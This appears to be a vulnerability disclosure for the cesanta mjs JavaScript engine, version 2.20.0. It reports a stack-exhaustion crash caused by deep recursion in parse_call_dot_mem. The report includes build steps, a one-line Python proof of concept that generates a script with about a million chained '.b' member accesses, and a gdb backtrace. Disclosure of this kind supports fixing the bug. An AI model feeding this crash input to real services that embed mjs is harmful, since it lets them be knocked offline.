**The name of an affected Product**

[mjs](https://github.com/cesanta/mjs)

**The affected version**

Commit: [b1b6eac](https://github.com/cesanta/mjs/commit/b1b6eac6b1e5b830a5cb14f8f4dc690ef3162551) (Tag: [2.20.0](https://github.com/cesanta/mjs/releases/tag/2.20.0))

**Description**

An issue in cesanta mjs 2.20.0 allows a remote attacker to cause a denial of service via the parse_call_dot_mem function in the mjs_parser.c file.

**Vulnerability Type**

Segmentation fault

**Environment**

- Operating System

```
Debian GNU/Linux 12
```

- Steps to Reproduce

```
git clone https://github.com/cesanta/mjs
cd mjs
make
```

- poc

```
sysirq@debian:~/Work/analyse/mjs/build$ cat generate_poc.py 
#!/bin/python3

print("let b = b",".b"*1024000,";")
sysirq@debian:~/Work/analyse/mjs/build$ ./generate_poc.py > poc.js
sysirq@debian:~/Work/analyse/mjs/build$ ./mjs poc.js 
Segmentation fault
sysirq@debian:~/Work/analyse/mjs/build$ 
```

**gdb info**

```
sysirq@debian:~/Work/analyse/mjs/build$ gdb ./mjs 
GNU gdb (Debian 13.1-3) 13.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./mjs...
(gdb) set args poc.js 
(gdb) r
Starting program: /home/sysirq/Work/analyse/mjs/build/mjs poc.js 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x00000000004197c8 in skip_spaces_and_comments (p=<error reading variable: Cannot access memory at address 0x7fffff7feff8>)
    at src/mjs_tok.c:124
124	static void skip_spaces_and_comments(struct pstate *p) {
(gdb) bt
#0  0x00000000004197c8 in skip_spaces_and_comments (p=<error reading variable: Cannot access memory at address 0x7fffff7feff8>)
    at src/mjs_tok.c:124
#1  0x00000000004193ec in pnext (p=0x7fffffffe058) at src/mjs_tok.c:212
#2  0x0000000000414327 in ptest (p=0x7fffffffe058) at src/mjs_parser.c:45
#3  0x0000000000416549 in parse_literal (p=0x7fffffffe058, t=0x7fffffffe098) at src/mjs_parser.c:292
#4  0x0000000000415df2 in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:351
#5  0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#6  0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#7  0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#8  0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#9  0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#10 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#11 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#12 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#13 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#14 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#15 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#16 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#17 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#18 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#19 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#20 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#21 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#22 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#23 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#24 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#25 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#26 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#27 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#28 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#29 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#30 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
#31 0x000000000041631e in parse_call_dot_mem (p=0x7fffffffe058, prev_op=20) at src/mjs_parser.c:376
```
